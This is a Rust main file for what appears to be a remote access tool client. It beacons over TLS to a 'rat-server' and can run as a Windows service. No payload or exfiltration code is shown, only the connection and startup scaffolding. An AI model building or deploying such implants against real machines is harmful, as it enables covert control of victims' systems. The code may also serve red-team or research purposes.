use std::sync::Arc;

use clap::Parser;
use log::info;
use rat_client::cli::Arguments;
use rat_client::client::Client;
use rat_client::config::Config;
#[cfg(windows)]
use rat_client::service::WindowsServiceDispatcher;
use rat_common::framework::Module;
use rat_common::logger::initialize_logger;
use rustls::pki_types::pem::PemObject;
use rustls::pki_types::{CertificateDer, ServerName};
use tokio::signal;

const ROOT_CA: &[u8] = include_bytes!("../../certs/root.crt");

async fn beacon(config: Config) -> Option<Arc<Client>> {
    tokio::select! {
        client = Client::connect(config) => {
            Some(Arc::new(client))
        }
        _ = signal::ctrl_c() => {
            info!("Received Ctrl-C signal during beaconing.");
            None
        }
    }
}

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    let arguments = Arguments::parse();
    initialize_logger(arguments.log_level, &arguments.log_path)?;

    #[cfg(windows)]
    let scm_thread = if arguments.scm {
        Some(WindowsServiceDispatcher::start())
    } else {
        None
    };

    let mut trusted_roots = rustls::RootCertStore::empty();
    for cert in CertificateDer::pem_reader_iter(ROOT_CA) {
        trusted_roots.add(cert?)?;
    }

    let config = Config {
        server: arguments.host.clone(),
        cert_server_name: ServerName::try_from("rat-server")?,
        cert_trusted_roots: trusted_roots,
    };

    info!("Starting client: {arguments:?}");
    let client = match beacon(config).await {
        Some(c) => c,
        None => {
            return Ok(());
        }
    };

    let client_c = client.clone();
    tokio::spawn(async move {
        info!("Registered Ctrl-C handler.");
        let _ = signal::ctrl_c().await;
        info!("Received Ctrl-C signal.");
        client_c.stop();
    });

    client.run().await?;

    #[cfg(windows)]
    if let Some(scm) = scm_thread {
        scm.stop().await;
    }

    Ok(())
}
